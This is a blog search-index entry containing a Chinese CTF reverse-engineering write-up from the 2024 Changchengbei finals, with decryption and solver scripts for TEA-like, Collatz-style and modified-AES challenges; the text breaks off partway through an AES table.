<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024第一届长城杯决赛-re&amp;pwn</title>
    <link href="/page/wp/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
    <url>/page/wp/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="REVERSE">REVERSE</h1><h2 id="kernel">kernel</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *a,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *b)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> magic[]=&#123;<span class="hljs-number">0x1234</span>,<span class="hljs-number">0x3a4d</span>,<span class="hljs-number">0x5e6f</span>,<span class="hljs-number">0xaa33</span>&#125;;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5=*a;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6=*b;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">33</span>;i++)&#123;<br>        v4 -= <span class="hljs-number">1640951535</span>;<br>    &#125;<br><br>   <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; ++i )<br>  &#123;<br>    v6 -= ((magic[(v4&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]) + v4) ^ (v5 + ((v5 &gt;&gt; <span class="hljs-number">6</span>) ^ (<span class="hljs-number">8</span> * v5)));<br>    v4 += <span class="hljs-number">1640951535</span>;<br>    v5 -= ((magic[v4&amp;<span class="hljs-number">3</span>]) + v4) ^ (v6 + ((v6 &gt;&gt; <span class="hljs-number">6</span>) ^ (<span class="hljs-number">4</span> * v6)));<br>  &#125;<br>  *a=v5;<br>  *b=v6;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> data[<span class="hljs-number">8</span>] = &#123;<br>        <span class="hljs-number">0x8CCAF011</span>, <span class="hljs-number">0x835A03B8</span>, <span class="hljs-number">0x6DCC9BAD</span>, <span class="hljs-number">0xE671FA99</span>, <span class="hljs-number">0xE6011F35</span>, <span class="hljs-number">0xE5A56CC8</span>, <span class="hljs-number">0xD4847CFA</span>, <span class="hljs-number">0x5D8E0B8E</span><br>    &#125;;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(data+i,data+i+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,((<span class="hljs-type">char</span>*)data)[<span class="hljs-number">3</span>-j+i*<span class="hljs-number">4</span>]);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,((<span class="hljs-type">char</span>*)data)[<span class="hljs-number">3</span>-j+i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>]);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="puzzle（赛后复现）">puzzle（赛后复现）</h2><p><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240528185432676.png" srcset="/img/loading.gif" lazyload alt=""></p><p>最终要比较的链表中字符串的顺序为ISCC2024,但在解析输入创建链表时是反过来的<br><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240528185420924.png" srcset="/img/loading.gif" lazyload alt=""><br>这里num2ch的代码太短了就不贴出来了，其内容就是对数字异或0x8d并且只取最低的一个字节</p><p>通过分析代码发现最终的数字满足两个条件，假设数字为a，则 a满足 <code>a%2==0 &amp;&amp; (a-1)%3==0</code></p><p>所以我可以想到当数字的最低位为1时，可能是进行了<code>(a-1)/3</code>操作，而最低为为0时则可能是进行了<code>a*2</code>操作</p><p>基于这个猜想写出下面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getdata</span>(<span class="hljs-params">num</span>):<br>    data=num<br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> data!=<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> data&amp;<span class="hljs-number">1</span> ==<span class="hljs-number">1</span>:<br>            data=(data*<span class="hljs-number">3</span>)+<span class="hljs-number">1</span><br>            result=<span class="hljs-string">&#x27;b&#x27;</span>+result<br>        <span class="hljs-keyword">else</span>:<br>            data=data//<span class="hljs-number">2</span><br>            result=<span class="hljs-string">&#x27;a&#x27;</span>+result<br>        data=data&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> result<br>  <br>data=<span class="hljs-string">b&quot;ISCC2024&quot;</span>[::-<span class="hljs-number">1</span>]<br>e=[]<br><span class="hljs-keyword">for</span> i,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>    d=getdata(((k^<span class="hljs-number">0x8d</span>)-i))<br>    <span class="hljs-keyword">if</span> d!=<span class="hljs-literal">None</span>:<br>        e.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(d),<span class="hljs-built_in">chr</span>(k))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span>.join(e))<br>  <br><span class="hljs-comment"># flag&#123;W0w_U_Ar3_V3ry_G00d_A7_C0unt1n9_3c968eb5d72c3dca&#125;</span><br><span class="hljs-comment"># a 是 2的倍数  </span><br><span class="hljs-comment"># a-1 是 3的倍数</span><br></code></pre></td></tr></table></figure><h2 id="crazyaes（赛后复现）">crazyaes（赛后复现）</h2><p>先修复程序的PE头，之后修复UPX字段就可以使用upx工具进行脱壳了<br>下面分析程序<br>程序是一个魔改过的aes加密，修改了aes加密流程中的三个地方<br><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240528184804639.png" srcset="/img/loading.gif" lazyload alt=""></p><p>第一个点就是在使用密钥与明文进行异或之后又进行了一次异或<br>因为异或操作可以还原，所以解密时可以先对密钥进行异或之后再对密钥进行列混合操作就可以解密这一部分</p><p><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240528185152330.png" srcset="/img/loading.gif" lazyload alt=""></p><p>第二个点就是在对明文进行S盒代换时异或了0xa1,其实这就相当于改变了S盒，只要用改变后的S盒获取新的D盒就好了，不过得注意在进行扩展密钥操作时用的是初始的S盒</p><p><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240528185036187.png" srcset="/img/loading.gif" lazyload alt=""></p><p>第三部分就是在对明文进行列混合时异或了0x54,这个只要在解密时对密文进行列混合时也异或0x54就好了，注意不要密文和密钥都异或0x54，因为这样相当于没异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">aes</span>:<br>    Round_num=<span class="hljs-number">10</span><br><br>    S_Box=[ <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>            <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>            <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>            <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>            <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>            <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>            <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>            <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>            <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>            <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>            <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>            <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>            <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>            <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>            <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span>]<br>    <br>    Rcon=[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>,<br>          <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>,<br>          <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>,<br>          <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>,<br>          <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x36</span>]<br><br>    En_Status=[[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<br>               [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>],<br>               [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>               [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]]<br><br>    De_Status=[[<span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>],<br>               [<span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>],<br>               [<span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>],<br>               [<span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>]]<br><br>    D_Box=[<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>           <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>           <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>           <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>           <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>           <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span 